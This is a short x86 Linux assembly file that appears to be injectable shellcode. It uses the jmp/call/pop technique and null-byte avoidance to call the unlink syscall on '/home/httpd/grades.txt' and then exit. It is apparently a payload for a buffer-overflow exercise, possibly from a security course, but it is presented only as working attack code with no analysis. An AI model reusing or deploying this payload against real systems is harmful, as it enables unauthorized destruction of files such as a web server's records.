#define STRING "/home/httpd/grades.txt"
#define STRLEN 22

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
    xorl    %eax,%eax
	movb    %al,(STRLEN)(%esi)
    movb	$0x9,%al		/* syscall arg 1: syscall number */
	inc     %eax
    movl	%esi,%ebx		/* syscall arg 2: string pathname */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.string	STRING
